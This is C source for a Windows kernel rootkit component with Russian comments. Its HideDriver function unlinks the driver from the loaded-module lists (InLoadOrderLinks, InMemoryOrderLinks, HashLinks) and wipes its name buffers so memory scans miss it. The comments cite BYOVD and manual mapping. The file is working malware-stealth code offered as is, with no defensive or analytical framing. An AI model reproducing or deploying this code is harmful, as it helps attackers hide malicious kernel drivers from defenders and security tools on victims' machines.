#include "rootkit.h"

// LDR_DATA_TABLE_ENTRY — структура в PsLoadedModuleList
typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY  InLoadOrderLinks;
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG       Flags;
    USHORT      LoadCount;
    USHORT      TlsIndex;
    LIST_ENTRY  HashLinks;
    PVOID       SectionPointer;
    ULONG       CheckSum;
    ULONG       TimeDateStamp;
    PVOID       LoadedImports;
    PVOID       EntryPointActivationContext;
    PVOID       PatchInformation;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    if (!DriverObject) return;

    // получаем нашу LDR_DATA_TABLE_ENTRY через DriverSection
    PLDR_DATA_TABLE_ENTRY_FULL ldr =
        (PLDR_DATA_TABLE_ENTRY_FULL)DriverObject->DriverSection;
    if (!ldr) return;

    // 1. вырезаем из PsLoadedModuleList (InLoadOrderLinks)
    RemoveEntryList(&ldr->InLoadOrderLinks);
    InitializeListHead(&ldr->InLoadOrderLinks);

    // 2. вырезаем из InMemoryOrderLinks
    RemoveEntryList(&ldr->InMemoryOrderLinks);
    InitializeListHead(&ldr->InMemoryOrderLinks);

    // 3. чистим HashLinks — иначе находят через хэш-таблицу модулей
    RemoveEntryList(&ldr->HashLinks);
    InitializeListHead(&ldr->HashLinks);

    // 4. убираем нашу запись из MmDriverObjectType ObjectDirectory
    // (поиск через \Driver\ namespace — не обязательно если BYOVD/manual map)
    // при manual map DriverSection уже NULL, так что выше безопасно

    // 5. обнуляем BaseDllName чтобы не светилось при сканировании памяти
    RtlZeroMemory(ldr->BaseDllName.Buffer,
                  ldr->BaseDllName.Length);
    ldr->BaseDllName.Length        = 0;
    ldr->BaseDllName.MaximumLength = 0;
    ldr->BaseDllName.Buffer        = NULL;

    RtlZeroMemory(ldr->FullDllName.Buffer,
                  ldr->FullDllName.Length);
    ldr->FullDllName.Length        = 0;
    ldr->FullDllName.MaximumLength = 0;
    ldr->FullDllName.Buffer        = NULL;
}
